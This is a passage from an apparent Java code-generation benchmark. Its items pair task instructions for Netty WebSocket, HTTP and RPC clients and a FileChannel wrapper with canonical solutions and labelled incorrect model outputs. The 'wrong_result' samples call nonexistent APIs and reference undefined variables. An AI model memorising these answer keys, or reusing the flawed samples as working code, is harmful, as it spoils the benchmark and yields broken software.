= new AtomicInteger();\n\n    public WebSocketTestClient(WebSocketVersion version, URI uri) {\n        this.uri = uri;\n        this.version = version;\n    }\n\n    public WebSocketTestClient connect() throws Exception {\n        String protocol = uri.getScheme();\n        if (!\"ws\".equals(protocol)) {\n            throw new IllegalArgumentException(\"Unsupported protocol: \" + protocol);\n        }\n        final WebSocketClientHandshaker handshaker =\n                WebSocketClientHandshakerFactory.newHandshaker(\n                        uri, version, null, false, new DefaultHttpHeaders());\n        WSClientHandler handler = new WSClientHandler(handshaker);\n        EventLoopGroup group = new NioEventLoopGroup();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel channel) throws Exception {\n                        ChannelPipeline p = channel.pipeline();\n                        p.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192), handler);\n                    }\n                });\n\n        ChannelFuture future =\n                bootstrap.connect(\n                        new InetSocketAddress(uri.getHost(), uri.getPort()));\n        future.syncUninterruptibly();\n        handler.handshakeFuture.syncUninterruptibly();\n        ch = future.channel();\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, final FrameListener listener) {\n        ch.pipeline().addLast(\"responseHandler\" + count.incrementAndGet(), new SimpleChannelInboundHandler<Object>() {\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n                if (msg instanceof CloseWebSocketFrame) {\n                    closed = true;\n                }\n                listener.onFrame((WebSocketFrame) msg);\n                ctx.pipeline().remove(this);\n            }\n\n            @Override\n            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n                cause.printStackTrace();\n                listener.onError(cause);\n                ctx.pipeline().remove(this);\n            }\n        });\n        ChannelFuture cf = ch.writeAndFlush(frame).syncUninterruptibly();\n        if (!cf.isSuccess()) {\n            listener.onError(cf.cause());\n        }\n        return this;\n    }\n\n    public void destroy() {\n        this.destroy(false);\n    }\n\n    public void destroy(boolean dirty) {\n        if (!closed && !dirty) {\n            final CountDownLatch latch = new CountDownLatch(1);\n            send(new CloseWebSocketFrame(), new FrameListener() {\n                @Override\n                public void onFrame(WebSocketFrame frame) {\n                    latch.countDown();\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    latch.countDown();\n                }\n            });\n            try {\n                latch.await(10, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }\n        if (ch != null) {\n            ch.close().syncUninterruptibly();\n        }\n        try {\n            bootstrap.group().shutdownGracefully(0, 1, TimeUnit.SECONDS).get();\n        } catch (InterruptedException | ExecutionException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public boolean isActive() {\n        return this.ch != null && this.ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return this.ch != null && this.ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return this.ch != null && this.ch.isWritable();\n    }\n\n    public interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n\n    private static final class WSClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final WebSocketClientHandshaker handshaker;\n        private ChannelPromise handshakeFuture;\n\n        WSClientHandler(WebSocketClientHandshaker handshaker) {\n            super(false);\n            this.handshaker = handshaker;\n        }\n\n        public ChannelFuture handshakeFuture() {\n            return handshakeFuture;\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            handshakeFuture = ctx.newPromise();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            handshaker.handshake(ctx.channel());\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object o) throws Exception {\n            Channel ch = ctx.channel();\n            if (!handshaker.isHandshakeComplete()) {\n                handshaker.finishHandshake(ch, (FullHttpResponse) o);\n                handshakeFuture.setSuccess();\n                ReferenceCountUtil.release(o);\n                return;\n            }\n\n            if (o instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) o;\n                ReferenceCountUtil.release(o);\n                throw new Exception(\"Unexpected HttpResponse (status=\" + response.getStatus() + \", content=\"\n                        + response.content().toString(CharsetUtil.UTF_8) + ')');\n            }\n            ctx.fireChannelRead(o);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            if (!handshakeFuture.isDone()) {\n                handshakeFuture.setFailure(cause);\n            }\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport java.net.URI;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.*;\n\npublic class WebSocketTestClient {\n    private final Bootstrap bootstrap;\n    private Channel ch;\n    private URI uri;\n    private WebSocketVersion version;\n    private boolean closed;\n    private AtomicInteger count;\n\n    public WebSocketTestClient() {\n        bootstrap = new Bootstrap();\n        bootstrap.group(new NioEventLoopGroup());\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));\n                ch.pipeline().addLast(new HttpClientCodec());\n                ch.pipeline().addLast(new WSClientHandler());\n            }\n        });\n    }\n\n    public WebSocketTestClient connect() {\n        try {\n            ChannelFuture future = bootstrap.connect(uri.toURL()).sync();\n            ch = future.channel();\n            future.addListener(future -> {\n                if (future.isSuccess()) {\n                    System.out.println(\"Connected to \" + uri);\n                } else {\n                    System.err.println(\"Connection failed: \" + future.cause());\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, FrameListener listener) {\n        ch.writeAndFlush(frame);\n        ((WSClientHandler) ch.pipeline().get(WSClientHandler.class)).addFrameListener(listener);\n        return this;\n    }\n\n    public void destroy() {\n        if (ch != null && ch.isOpen()) {\n            ch.close();\n        }\n    }\n\n    public void destroy(boolean dirty) {\n        if (ch != null && ch.isOpen()) {\n            if (dirty) {\n                ch.closeNow();\n            } else {\n                ch.close();\n            }\n        }\n    }\n\n    public boolean isActive() {\n        return ch != null && ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return ch != null && ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return ch != null && ch.isWritable();\n    }\n\n    public void setUri(URI uri) {\n        this.uri = uri;\n    }\n\n    public void setVersion(WebSocketVersion version) {\n        this.version = version;\n    }\n\n    public void setCount(AtomicInteger count) {\n        this.count = count;\n    }\n\n    private static class WSClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final List<FrameListener> listeners = new ArrayList<>();\n        private final ChannelFuture handshakeFuture = new DefaultChannelFuture(null, null);\n\n        public ChannelFuture handshakeFuture() {\n            return handshakeFuture;\n        }\n\n        public void addFrameListener(FrameListener listener) {\n            listeners.add(listener);\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) throws Exception {\n            // Initialize handshake promise\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                    ctx.getChannel(), new WebSocketVersion(WebSocketVersion.HIXIE_76));\n            if (handshaker == null) {\n                // Handle invalid URI\n                ctx.close();\n                return;\n            }\n            handshaker.handshake(ctx.getChannel(), uri);\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (msg instanceof WebSocketFrame) {\n                for (FrameListener listener : listeners) {\n                    listener.onFrame((WebSocketFrame) msg);\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            for (FrameListener listener : listeners) {\n                listener.onError(cause);\n            }\n            ctx.close();\n        }\n    }\n\n    public interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n}"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using Netty framework for making GET and POST requests to a remote server, with support for timeout handling and asynchronous response processing.\n\nClass Description: TestHttpClient is a Netty-based HTTP client that handles both GET and POST requests asynchronously. It manages connection pooling, request/response processing, and timeout handling. The class uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- host: String - The target server hostname or IP address\n- port: int - The target server port number\n- defaultTimeout: int - Default timeout in milliseconds for request completion\n- workerGroup: NioEventLoopGroup - Netty event loop group for handling I/O operations\n- b: Bootstrap - Netty bootstrap for client configuration\n- results: ConcurrentHashMap<String, CompletableFuture<String>> - Map for tracking pending requests and their futures\n\nMethods:\n- init(): void - Initializes the Netty client configuration including pipeline setup\n- close(): void - Shuts down the client gracefully and releases resources\n- get(String uri) -> String - Sends an HTTP GET request to the specified URI\n- post(String uri, Map<String, String> params, Map<String, String> headers) -> String - Sends an HTTP POST request with parameters and headers\n- send(HttpRequest request) -> String - Internal method for sending requests and handling responses",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.multipart.DefaultHttpDataFactory;\nimport io.netty.handler.codec.http.multipart.HttpPostRequestEncoder;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.URI;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.TimeUnit;\n\npublic class TestHttpClient {\n    private String host;\n    private int port;\n    private int defaultTimeout;\n    private EventLoopGroup workerGroup;\n    private Bootstrap b;\n    private Map<String, CompletableFuture<String>> results = new ConcurrentHashMap<>();\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        init();\n    }\n\n    private void init() {\n        b = new Bootstrap();\n        workerGroup = new NioEventLoopGroup();\n        b.group(workerGroup).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(\"http-decoder\", new HttpResponseDecoder());\n                ch.pipeline().addLast(\"http-encoder\", new HttpRequestEncoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(1024 * 1024));\n                ch.pipeline().addLast(\"clientHandler\", new SimpleChannelInboundHandler<FullHttpResponse>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpResponse httpResponse) {\n                        CompletableFuture<String> future = results.get(ctx.channel().id().asLongText());\n                        if (future != null) {\n                            future.complete(httpResponse.content().toString(CharsetUtil.UTF_8));\n                        }\n                    }\n                });\n            }\n        });\n    }\n\n    public void close() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n            workerGroup = null;\n        }\n        results.clear();\n    }\n\n    public String get(String uri) throws Exception {\n        DefaultHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, new URI(uri).toASCIIString());\n        return send(request);\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) throws Exception {\n        HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(uri).toASCIIString());\n        if (params != null && !params.isEmpty()) {\n            HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(new DefaultHttpDataFactory(), request, false);\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                encoder.addBodyAttribute(entry.getKey(), entry.getValue());\n            }\n            request = encoder.finalizeRequest();\n        }\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                request.headers().set(entry.getKey(), entry.getValue());\n            }\n        }\n        return send(request);\n    }\n\n    private String send(HttpRequest request) throws Exception {\n        ChannelFuture f = b.connect(host, port).sync();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(f.channel().id().asLongText(), future);\n        String result;\n        try {\n            f.channel().writeAndFlush(request).sync();\n            result = future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n        } finally {\n            results.remove(f.channel().id().asLongText());\n            f.channel().closeFuture().sync();\n        }\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.cookie.CookieDecoder;\nimport io.netty.handler.codec.http.cookie.ServerCookieEncoder;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerHandshakerFactory;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.TrustManagerFactory;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\nimport io.netty.util.CharsetUtil;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.charset.StandardCharsets;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Logger;\n\npublic class TestHttpClient {\n    private final String host;\n    private final int port;\n    private final int defaultTimeout;\n    private final EventLoopGroup workerGroup;\n    private final Bootstrap b;\n    private final ConcurrentHashMap<String, CompletableFuture<String>> results;\n    private static final Logger logger = Logger.getLogger(TestHttpClient.class.getName());\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        this.workerGroup = new NioEventLoopGroup();\n        this.results = new ConcurrentHashMap<>();\n        this.b = new Bootstrap();\n    }\n\n    public void init() {\n        b.group(workerGroup);\n        b.channel(NioSocketChannel.class);\n        b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, defaultTimeout);\n        b.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new HttpClientCodec());\n                ch.pipeline().addLast(new HttpObjectAggregator(1024 * 1024));\n                ch.pipeline().addLast(new SimpleChannelInboundHandler<FullHttpResponse>() {\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpResponse response) {\n                        String requestId = (String) ctx.channel().attr(AttributeKey.valueOf(\"requestId\"));\n                        if (requestId != null) {\n                            CompletableFuture<String> future = results.get(requestId);\n                            if (future != null) {\n                                try {\n                                    future.complete(response.content().toString(CharsetUtil.UTF_8));\n                                } catch (Exception e) {\n                                    future.completeExceptionally(e);\n                                }\n                                results.remove(requestId);\n                            }\n                        }\n                    }\n\n                    @Override\n                    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                        String requestId = (String) ctx.channel().attr(AttributeKey.valueOf(\"requestId\"));\n                        if (requestId != null) {\n                            CompletableFuture<String> future = results.get(requestId);\n                            if (future != null) {\n                                future.completeExceptionally(cause);\n                                results.remove(requestId);\n                            }\n                        }\n                        ctx.close();\n                    }\n                });\n            }\n        });\n    }\n\n    public void close() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public String get(String uri) {\n        String requestId = UUID.randomUUID().toString();\n        results.put(requestId, new CompletableFuture<>());\n        HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri);\n        request.headers().set(HttpHeaderNames.HOST, host);\n        send(request, requestId);\n        try {\n            return results.get(requestId).get(10, TimeUnit.SECONDS);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Request failed\", e);\n        }\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) {\n        String requestId = UUID.randomUUID().toString();\n        results.put(requestId, new CompletableFuture<>());\n        HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, uri);\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                request.headers().set(entry.getKey(), entry.getValue());\n            }\n        }\n        if (params != null) {\n            StringBuilder formData = new StringBuilder();\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                try {\n                    formData.append(URLEncoder.encode(entry.getKey(), StandardCharsets.UTF_8.name()))\n                            .append('=')\n                            .append(URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8.name()))\n                            .append('&');\n                } catch (UnsupportedEncodingException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n            if (formData.length() > 0) {\n                formData.setLength(formData.length() - 1);\n            }\n            request.content().writeBytes(formData.toString().getBytes(StandardCharsets.UTF_8));\n        }\n        send(request, requestId);\n        try {\n            return results.get(requestId).get(10, TimeUnit.SECONDS);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Request failed\", e);\n        }\n    }\n\n    private void send(HttpRequest request, String requestId) {\n        ChannelFuture future = b.connect(host, port).syncUninterruptibly();\n        future.channel().attr(AttributeKey.valueOf(\"requestId\")).set(requestId);\n        future.channel().writeAndFlush(request).addListener(future1 -> {\n            if (future1.isSuccess()) {\n                logger.info(\"Request sent successfully\");\n            } else {\n                logger.warning(\"Request failed to send: \" + future1.cause());\n            }\n        });\n    }\n}\n```"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Create a Java class that provides functionality for interacting with files using Java NIO's FileChannel and memory-mapped file operations. The class should support opening files, mapping files to memory, accessing mapped buffers, forcing writes to disk, and properly closing resources.\n\nClass Description: The FileChannelInteractor class encapsulates operations for file channel interaction and memory-mapped file operations using Java NIO. It provides methods to open files, map file regions to memory, access mapped buffers, ensure data persistence, and clean up resources.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedBuffer: MappedByteBuffer - The buffer representing the memory-mapped file region\n\nMethods:\nopenFileChannel: openFileChannel(String filePath) -> void - Opens a FileChannel for reading the specified file. Throws IOException if the file cannot be opened.\nmapFileToMemory: mapFileToMemory(long position, long size) -> void - Maps a region of the file into memory for read-only access. Throws IOException if mapping fails.\ngetMappedBuffer: getMappedBuffer() -> MappedByteBuffer - Returns the currently mapped byte buffer.\ncloseChannel: closeChannel() -> void - Closes the FileChannel and releases associated resources. Throws IOException if closing fails.\nforceWriteToDisk: forceWriteToDisk() -> void - Forces any changes made to the mapped buffer to be written to disk (though in this implementation the buffer is read-only).",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.MappedByteBuffer;\nimport java.nio.file.Path;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        Path path = Paths.get(filePath);\n        this.fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        this.mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return this.mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (this.fileChannel != null) {\n            this.fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() {\n        if (this.mappedBuffer != null) {\n            this.mappedBuffer.force();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        fileChannel = FileChannel.open(Paths.get(filePath), StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.force(true);\n        }\n    }\n}"
  },
  {
    "Task_id": 121,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for RPC communication, handling connection management, message sending, and resource cleanup.\n\nClass Description: NettyConnectClient is a TCP client implementation using Netty framework for RPC communication. It manages network connections, handles message encoding/decoding, and provides methods for connection validation and resource cleanup.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads and event processing\n- channel: [Channel] - Represents the active network connection to the server\n\nMethods:\n- init: [void]([String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory]) -> [void] - Initializes the client connection, sets up the pipeline with encoders/decoders, and establishes connection to the server\n- isValidate: [void]() -> [boolean] - Checks if the current connection is active and valid\n- close: [void]() -> [void] - Closes the active connection and releases all resources\n- send: [void]([XxlRpcRequest xxlRpcRequest]) -> [void] - Sends an RPC request through the established channel",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyDecoder;\nimport com.wugui.datax.rpc.remoting.net.impl.netty.codec.NettyEncoder;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport com.wugui.datax.rpc.util.IpUtil;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyConnectClient thisClient = this;\n\n        Object[] array = IpUtil.parseIpPort(address);\n        String host = (String) array[0];\n        int port = (int) array[1];\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new NettyEncoder(XxlRpcRequest.class, serializer))\n                                .addLast(new NettyDecoder(XxlRpcResponse.class, serializer))\n                                .addLast(new NettyClientHandler(xxlRpcInvokerFactory, thisClient));\n                    }\n                })\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        this.channel.writeAndFlush(xxlRpcRequest).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) {\n        group = new EventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new RpcEncoder(serializer));\n                        pipeline.addLast(new RpcDecoder(serializer));\n                        pipeline.addLast(new SimpleChannelInboundHandler<XxlRpcRequest>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, XxlRpcRequest msg) {\n                                // Handle incoming messages\n                            }\n                        });\n                    }\n                });\n\n        String[] parts = address.split(\":\");\n        String host = parts[0];\n        int port = Integer.parseInt(parts[1]);\n        ChannelFuture future = bootstrap.connect(host, port).sync();\n        channel = future.channel();\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isConnected();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n            channel = null;\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void send(XxlRpcRequest xxlRpcRequest) {\n        if (channel != null && channel.isActive()) {\n            channel.writeAndFlush(xxlRpcRequest);\n        }\n    }\n\n    private static class RpcEncoder extends MessageToByteEncoder<XxlRpcRequest> {\n        private final Serializer serializer;\n\n        public RpcEncoder(Serializer serializer) {\n            this.serializer = serializer;\n        }\n\n        @Override\n        protected void encode(ChannelHandlerContext ctx, XxlRpcRequest msg, ByteBuf out) throws Exception {\n            byte[] data = serializer.serialize(msg);\n            out.writeBytes(data);\n        }\n    }\n\n    private static class RpcDecoder extends ByteToMessageDecoder {\n        private final Serializer serializer;\n\n        public RpcDecoder(Serializer serializer) {\n            this.serializer = serializer;\n        }\n\n        @Override\n        protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n            if (in.readableBytes() < 4) {\n                return;\n            }\n            int length = in.readInt();\n            if (in.readableBytes() < length) {\n                return;\n            }\n            byte[] data = new byte[length];\n            in.readBytes(data);\n            out.add(serializer.deserialize(data));\n        }\n    }\n}"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Implement a Netty-based RPC client in Java that handles remote procedure calls, manages connections, and processes responses asynchronously.\n\nClass Description: NettyRpcClient is a final class that implements RpcRequestTransport interface. It provides functionality for establishing TCP connections using Netty framework, sending RPC requests, and managing client-side communication with a remote server. The class handles connection pooling, request tracking, and graceful shutdown.\n\nAttributes:\n- serviceDiscovery: [ServiceDiscovery] - Handles service lookup to find the appropriate server address\n- unprocessedRequests: [UnprocessedRequests] - Tracks outstanding RPC requests and their corresponding futures\n- channelProvider: [ChannelProvider] - Manages and provides channels for communication\n- bootstrap: [Bootstrap] - Netty's client bootstrap configuration\n- eventLoopGroup: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRpcClient() -> [void] - Constructor that initializes the Netty client configuration, including event loop group, bootstrap, and pipeline handlers\n- doConnect(InetSocketAddress inetSocketAddress) -> [Channel] - Establishes a connection to the specified remote address and returns the channel\n- sendRpcRequest(RpcRequest rpcRequest) -> [Object] - Sends an RPC request to the server and returns a CompletableFuture containing the response\n- getChannel(InetSocketAddress inetSocketAddress) -> [Channel] - Retrieves or creates a channel for the specified address\n- close() -> [void] - Shuts down the client gracefully and releases resources",
    "Canonical_solution": "import github.javaguide.enums.CompressTypeEnum;\nimport github.javaguide.enums.SerializationTypeEnum;\nimport github.javaguide.enums.ServiceDiscoveryEnum;\nimport github.javaguide.extension.ExtensionLoader;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.registry.ServiceDiscovery;\nimport github.javaguide.remoting.constants.RpcConstants;\nimport github.javaguide.remoting.dto.RpcMessage;\nimport github.javaguide.remoting.dto.RpcRequest;\nimport github.javaguide.remoting.dto.RpcResponse;\nimport github.javaguide.remoting.transport.RpcRequestTransport;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic final class NettyRpcClient implements RpcRequestTransport {\n    private final ServiceDiscovery serviceDiscovery;\n    private final UnprocessedRequests unprocessedRequests;\n    private final ChannelProvider 